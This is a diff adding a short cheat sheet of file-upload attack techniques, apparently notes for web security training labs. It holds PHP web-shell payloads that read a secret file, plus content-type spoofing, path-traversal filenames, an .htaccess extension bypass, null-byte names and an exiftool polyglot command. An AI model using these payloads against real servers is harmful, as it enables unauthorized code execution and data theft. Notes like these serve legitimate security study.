@@ -1,1 +1,11 @@
-Remote code Execution -->
+Remote code Execution --> Upload a php file with the following content --> <?php echo file_get_contents('/home/carlos/secret'); ?> ---> Check the get request searching for the filename
+Content-type-restriction --> If the content type appears as application/x-php, try changing it to image/jpeg or image/png if specified in response !!
+Code-execution-path-traversal --->Use path such as ../exploit.php when uploading and then get the response as same as the filename uploaded ---> Url encode the slash("/")
+Extension-Blacklist-Bypass  -->Change the value of the filename parameter to .htaccess.
+                            -->Change the value of the Content-Type header to text/plain.
+                            -->Replace the content of file with --> AddType application/x-httpd-php .l33t
+                            -->Rename the file as with .l33t extension
+                            -->Use --> <?php echo file_get_contents('/home/carlos/secret'); ?> <---
+Obfuscated-File-Extension   --> filename="exploit.php%00.jpg" ---> Null byte extension --->.jpg is ignored in this case if the server is misconfigured
+Polyglot-File-Upload        -->exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+Race-Condition              -->Use get and post request at a same time !!
